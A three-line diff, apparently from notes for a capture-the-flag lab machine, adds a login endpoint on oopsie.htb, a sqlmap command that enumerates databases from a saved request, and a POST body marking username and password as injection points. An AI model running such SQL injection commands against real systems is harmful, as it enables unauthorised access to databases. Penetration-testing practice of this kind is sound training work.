@@ -1,0 +1,3 @@
+http://oopsie.htb:80/cdn-cgi/login/index.php (POST)  # /usr/bin/sqlmap -r login_request.txt --threads=9 --dbs --output-dir=sqlmap_result
+
+username=*&password=*
